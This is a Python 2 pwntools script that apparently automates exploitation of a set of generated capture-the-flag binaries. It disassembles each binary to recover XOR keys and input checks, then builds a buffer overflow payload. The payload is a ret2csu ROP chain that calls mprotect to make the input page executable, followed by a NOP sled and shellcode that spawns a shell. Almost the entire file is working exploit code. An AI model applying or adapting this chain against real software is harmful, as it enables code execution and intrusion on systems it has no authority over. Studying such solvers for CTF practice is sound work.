from elftools.elf.elffile import *
from capstone import *
from ipdb import set_trace
from z3 import *
import sys 
from pwn import *
from parseplt import *
f = None
elffile = None
executor = None
context.log_level = 'ERROR'
class function:
    def __init__(self, oplist):
        self.oplist = oplist
    def __str__(self): 
        res = ''
        for i in self.oplist:
            res += '%x:\t%s\t%s\n' %(i.address, i.mnemonic, i.op_str)
        return res

def logic2physic(addr):
    for s in elffile.iter_segments():
        baseaddr = s.header['p_vaddr']
        size = s.header['p_memsz']
        if addr >= baseaddr and addr <= baseaddr + size:
            offset = addr - baseaddr
            physicaddr = s.header['p_offset'] + offset
            return physicaddr
    raise Exception('logic2physic: addr not found.')

def physic2logic(addr):
    for s in elffile.iter_segments():
        baseaddr = s.header['p_offset']
        size = s.header['p_memsz']
        if addr >= baseaddr and addr <= baseaddr + size:
            offset = addr - baseaddr
            logicaddr = s.header['p_vaddr'] + offset
            return logicaddr
    raise Exception('physic2logic: addr not found')

def parsefunc(physicaddr):
    finish_symbol = ['ret', 'hlt']
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    cursor = physicaddr
    oplist = []
    while(True):
#        set_trace()
        f.seek(cursor)
        data = f.read(0x100)
        for i in md.disasm(data, physic2logic(cursor)):
            oplist.append(i)
            if i.mnemonic in finish_symbol:
                return function(oplist)
            if len(oplist) == 0x10000:
                raise Exception('parsefunc: too large function')
        tmp = oplist.pop()
        cursor = logic2physic(tmp.address)

def parsestr(physicaddr):
    f.seek(physicaddr)
    res = ''
    while(True):
        tmp = f.read(1)
        if tmp == '\x00':
            break
        res += tmp 
    return res

def get_init():
    global elffile 
    entryaddr = elffile.header['e_entry']
    func_start = parsefunc(logic2physic(entryaddr))
    for idx in range(len(func_start.oplist)):
        if func_start.oplist[idx].mnemonic == 'call':
            break 
    idx -= 2 
    init_vaddress = int(func_start.oplist[idx].op_str.split(', ')[1], 16)
    return parsefunc(logic2physic(init_vaddress))

def get_main():
    global elffile
    entryaddr = elffile.header['e_entry']
    func_start = parsefunc(logic2physic(entryaddr))
    for idx in range(len(func_start.oplist)):
        if func_start.oplist[idx].mnemonic == 'call':
            break
    idx -= 1
    if not (func_start.oplist[idx].mnemonic == 'mov' and func_start.oplist[idx - 1].mnemonic == 'mov' and func_start.oplist[idx - 2].mnemonic == 'mov'):
        raise Exception('get_main: next instruction error.')
    main_vaddress = int(func_start.oplist[idx].op_str.split(', ')[1], 16)
    return parsefunc(logic2physic(main_vaddress))

def parse_main(func_main):
    and_idx = None
    for idx in range(len(func_main.oplist)):
        tmp_ins = func_main.oplist[idx]
        if tmp_ins.mnemonic == 'and' and tmp_ins.op_str == 'eax, 1':
            and_idx = idx
            break
    if and_idx == None:
        raise Exception('parse_main: and eax, 1 not found')
    if not (func_main.oplist[and_idx + 1].mnemonic == 'test' and func_main.oplist[and_idx + 1].op_str == 'eax, eax' and func_main.oplist[and_idx + 2].mnemonic == 'jne'):
        raise Exception('parse_main: next instructions error.')
    ord_branch = int(func_main.oplist[and_idx + 2].op_str, 16)
    even_branch = func_main.oplist[and_idx + 2].address
    for idx in range(and_idx, len(func_main.oplist)):
        if func_main.oplist[idx].address == ord_branch:
            ord_branch_idx = idx
        if func_main.oplist[idx].address == even_branch:
            even_branch_idx = idx
    ord_xor_num = None
    even_xor_num = None
    for idx in range(ord_branch_idx, len(func_main.oplist)):
        tmp_ins = func_main.oplist[idx]
        # print tmp_ins.mnemonic
        if tmp_ins.mnemonic == 'xor':
            # print tmp_ins.address, tmp_ins.mnemonic, tmp_ins.op_str
            ord_xor_num = int(tmp_ins.op_str.split(', ')[1], 16) & 0xff
            break
    for idx in range(even_branch_idx, len(func_main.oplist)):
        tmp_ins = func_main.oplist[idx]
        if tmp_ins.mnemonic == 'xor':
            # print tmp_ins.address, tmp_ins.mnemonic, tmp_ins.op_str
            even_xor_num = int(tmp_ins.op_str.split(', ')[1], 16) & 0xff
            break
    if ord_xor_num == None or even_xor_num == None:
        # print ord_xor_num
        # print even_xor_num
        raise Exception('parse_main: xor instructions not found')
    # print hex(ord_xor_num)
    # print hex(even_xor_num)
    func_first_addr = None
    for idx in range(len(func_main.oplist)):
        if func_main.oplist[idx].mnemonic == 'movzx':
            if func_main.oplist[idx + 1].mnemonic == 'movzx' and\
            func_main.oplist[idx + 2].mnemonic == 'movzx' and\
            func_main.oplist[idx + 3].mnemonic == 'movzx' and\
            func_main.oplist[idx + 4].mnemonic == 'movzx' and\
            func_main.oplist[idx + 5].mnemonic == 'movzx':
                tmp = func_main.oplist[idx + 4].op_str
                offset = int(tmp.split(', ')[1].split(' + ')[1][:-1], 16)
                nextinsaddr = func_main.oplist[idx + 5].address
                inputaddr = nextinsaddr + offset
                for iidx in range(idx, len(func_main.oplist)):
                    tmp_ins = func_main.oplist[iidx]
                    # print hex(tmp_ins.address), tmp_ins.mnemonic, tmp_ins.op_str
                    if tmp_ins.mnemonic == 'call':
                        func_first_addr = int(tmp_ins.op_str, 16)
                        break 
                break
    if func_first_addr == None:
        raise Exception('parse_main: first function call not found.')
    func_first = parsefunc(logic2physic(func_first_addr))
    return even_xor_num, ord_xor_num, func_first, inputaddr

def parse_first_type(func):
    global executor
    count = 0
    for idx in range(len(func.oplist)):
        tmp_ins = func.oplist[idx]
        if tmp_ins.mnemonic == 'call':
            next_vaddr = int(tmp_ins.op_str, 16)
    nextfunc = parsefunc(logic2physic(next_vaddr))
    context.arch = 'amd64'
    edit_func = ''
    counter = 1
    for tmp_ins in func.oplist:
        if counter == 4:
            break
        if tmp_ins.mnemonic == 'jne':
            # print disasm(tmp_ins.bytes.__str__())
            edit_func += 'H\xc7\xc0' + p32(counter)
            offset = tmp_ins.bytes.__str__()[1]
            offset = ord(offset)
            offset += 0x10
            if offset > 0xff:
                raise Exception('parse_first_type: offset overflow.')
            edit_func += '\x75' + chr(offset)
            # print disasm('\x75' + chr(offset))
            counter += 1
        else:
            edit_func += tmp_ins.bytes.__str__()
    edit_func += 'H\xc7\xc0\x00\x00\x00\x00'
    edit_func += '\x90' * 0x200 + '\xc9\xc3'
    # md = Cs(CS_ARCH_X86, CS_MODE_64)
    # for i in md.disasm(edit_func, 0):
    #     print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
    executor.send('\x01')
    executor.send(edit_func.ljust(0x400, '\x00'))
    try:
        res = executor.recv(3)
    except Exception:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        for i in md.disasm(edit_func, 0):
            print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
        raise
    if not len(res) == 3:
        print res.encode('hex')
        raise Exception('parse_first_type: There is something wrong with the result.')
    return res, nextfunc


def parse_second_type(func): 
    tablelist = []
    for idx in range(len(func.oplist)):
        tmp_ins = func.oplist[idx]
        if tmp_ins.mnemonic == 'call':
            nextfuncvaddr = int(tmp_ins.op_str, 16)
            break
    # print func
    for idx in range(len(func.oplist)):
        tmp_ins = func.oplist[idx]
        if tmp_ins.mnemonic == 'mov' and tmp_ins.op_str.startswith('dword ptr [rbp -'):
            try:
                tmpval = eval(tmp_ins.op_str.split(', ')[1])
            except Exception:
                continue
            tablelist.append(tmpval)
            # print tmp_ins.address, tmp_ins.mnemonic, tmp_ins.op_str 
        if tmp_ins.mnemonic == 'cmp':
            result = eval(tmp_ins.op_str.split(', ')[1])
    # print result
    
    if len(tablelist) == 29:
        table1 = tablelist[0:10]
        table2 = tablelist[10:20]
        table3 = tablelist[20:29]
        res = table1.index(table2.index(table3.index(result)))
    if len(tablelist) == 192:
        table1 = tablelist[0:64]
        table2 = tablelist[64:128]
        table3 = tablelist[128:192]
        res = table1.index(table2.index(table3.index(result)))
    if len(tablelist) == 10:
        table1 = tablelist[0:5]
        table2 = tablelist[5:10]
        res = table1.index(table2.index(result))
    res = res + 48
    res = chr(res)
    nextfunc = parsefunc(logic2physic(nextfuncvaddr))
    return res, nextfunc

def parse_third_type(func): 
    count = 0
    targetstr = None
    for idx in range(len(func.oplist)):
        tmp_ins = func.oplist[idx]
        if tmp_ins.mnemonic == 'lea':
            if count == 0:
                count += 1
                continue
            else:
             # rax, [rip + 0x204c7c]
                tmp = tmp_ins.op_str.split(', ')[1]
                tmp = tmp.split('+ ')[1][:-1]
                stroffset = eval(tmp)
                base = func.oplist[idx + 1].address
                strvaddr = stroffset + base 
                targetstr = parsestr(logic2physic(strvaddr))
                break
    for idx in range(len(func.oplist)):
        tmp_ins = func.oplist[idx]
        if tmp_ins.op_str.startswith('rsp'):
            # print tmp_ins.mnemonic, tmp_ins.op_str
            if tmp_ins.mnemonic == 'sub':
                stacksize = int(tmp_ins.op_str.split(', ')[1], 16)
            elif tmp_ins.mnemonic == 'add':
                stacksize = -int(tmp_ins.op_str.split(', ')[1], 16)
            else:
                raise Exception('parse_third_type: stacksize parse error.')
            break
   
    offset = None
    for idx in range(len(func.oplist)):
        tmp_ins = func.oplist[-idx]
        if tmp_ins.mnemonic == 'lea':
            # print tmp_ins.mnemonic, tmp_ins.op_str
            op1 = tmp_ins.op_str.split(', ')[0]
            op2 = tmp_ins.op_str.split(', ')[1]
            if op1 == 'rax' and op2.startswith('[rbp - '):
                offset = int(op2.split(' - ')[1][:-1], 16)
            break
    if offset == None:
        raise Exception('parse_third_type: offset parse error.')
    padsize = offset - len(targetstr)
    return targetstr, padsize

def classify(func): 
    count = 0
    for i in func.oplist:
        if i.mnemonic == 'jne':
            count += 1
    if count == 3:
        return 1
    if count == 1:
        return 2
    return 3   

def encodeinput(even_xor_num, ord_xor_num, inp):
    res = ''
    for i in range(len(inp)):
        tmp = inp[i]
        tmp = ord(tmp)
        if i % 2 == 0:
            tmp ^= even_xor_num 
        else:
            tmp ^= ord_xor_num 
        tmp = hex(tmp)
        tmp = tmp[2:]
        tmp = tmp.rjust(2, '0')
        res += tmp
    return res

def main(filename):
    global f
    global elffile
    global executor
    f = open(filename, 'rb')
    elffile = ELFFile(f)
    executor = process('./execute')
    # pause()
    func_main = get_main()
    even_xor_num, ord_xor_num, func_first, inputaddr = parse_main(func_main)
    # print even_xor_num
    # print ord_xor_num
    func_cursor = func_first 
    prepayload = ''
    while True:
        if not classify(func_cursor) == 1:
            break
        res, func_cursor = parse_first_type(func_cursor)
        prepayload += res 
    print 'first type of function parse complete'
    executor.close()
    executor = None
    while True:
        if not classify(func_cursor) == 2:
            break
        # print func_cursor
        res, func_cursor = parse_second_type(func_cursor)
        prepayload += res 
    print 'second type of function parse complete'
    
    # print func_cursor
    tmpres, paddsize = parse_third_type(func_cursor)
    prepayload += tmpres
    print 'third type of function parse complete'
    print hex(inputaddr)
    plttable = parse_plt(elffile)
    # print plttable
    mprotectaddr = plttable['mprotect']
    f.seek(logic2physic(mprotectaddr))
    tmp = f.read(6)
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    for ins in md.disasm(tmp, mprotectaddr):
        tmp = ins 
        break
    if ' - ' in tmp.op_str:
        offset = int(tmp.op_str.split(' - ')[1][:-1], 16)
        mprotectgot = mprotectaddr + 6 - offset 
    elif ' + ' in tmp.op_str:
        offset = int(tmp.op_str.split(' + ')[1][:-1], 16)
        mprotectgot = mprotectaddr + 6 + offset
    else:
        raise Exception("main: mprotectgot parse error.")
    print hex(mprotectgot)
    prot = 1 | 2 | 4
    
    funcinit = get_init()
    '''
    0x8224ba0
    8021820:	push	r15
    8021822:	push	r14
    8021824:	mov	r15, rdx
    8021827:	push	r13
    8021829:	push	r12
    802182b:	lea	r12, [rip + 0x2015de]
    8021832:	push	rbp
    8021833:	lea	rbp, [rip + 0x2015de]
    802183a:	push	rbx
    802183b:	mov	r13d, edi
    802183e:	mov	r14, rsi
    8021841:	sub	rbp, r12
    8021844:	sub	rsp, 8
    8021848:	sar	rbp, 3
    802184c:	call	0x400728
    8021851:	test	rbp, rbp
    8021854:	je	0x8021876
    8021856:	xor	ebx, ebx
    8021858:	nop	dword ptr [rax + rax]
    8021860:	mov	rdx, r15
    8021863:	mov	rsi, r14
    8021866:	mov	edi, r13d
    8021869:	call	qword ptr [r12 + rbx*8]
    802186d:	add	rbx, 1
    8021871:	cmp	rbp, rbx
    8021874:	jne	0x8021860
    8021876:	add	rsp, 8
    802187a:	pop	rbx
    802187b:	pop	rbp
    802187c:	pop	r12
    802187e:	pop	r13
    8021880:	pop	r14
    8021882:	pop	r15
    8021884:	ret
    '''
    for ins in funcinit.oplist:
        if ins.mnemonic == 'pop' and ins.op_str == 'rbx':
            rop1 = ins.address
        if ins.mnemonic == 'mov' and ins.op_str == 'rdx, r15':
            rop2 = ins.address
    roppayload = p64(rop1)
    roppayload += p64(0)
    roppayload += p64(1)
    roppayload += p64(mprotectgot)
    roppayload += p64(inputaddr  - (inputaddr & 0xfff))
    roppayload += p64(0x1000)
    roppayload += p64(prot)
    roppayload += p64(rop2)
    roppayload += p64(0) * 7
    roppayload += p64(inputaddr + len(roppayload + 'a' * paddsize + 'bbbbbbbb') + 0x50)
    sc = ''
    context.arch = 'amd64'
    sc += asm(shellcraft.amd64.sh())
    prepayload += 'a' * paddsize + 'bbbbbbbb' + roppayload + '\x90' * 0x40 + sc
    payload = encodeinput(even_xor_num, ord_xor_num, prepayload)
    context.log_level = 'INFO'
    return payload
    p = process([filename, payload])
    context.log_level = 'ERROR'
    p.sendline('cat flag')
    p.interactive()


if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'test':
        faillist = []
        for i in range(20):
            print '-------------------------------------------------------------------'
            try:
                print '[binary' + str(i) + ']:'
                main('binaries/binary' + str(i))
            except Exception, e:
                print e
                faillist.append(i)
            print '-------------------------------------------------------------------'
        print "faillist"
        print faillist
    elif len(sys.argv) == 2:
        print '[binary' + sys.argv[1] + ']'
        main('binaries/binary' + sys.argv[1])
    else:
        main('binaries/binary0')
    
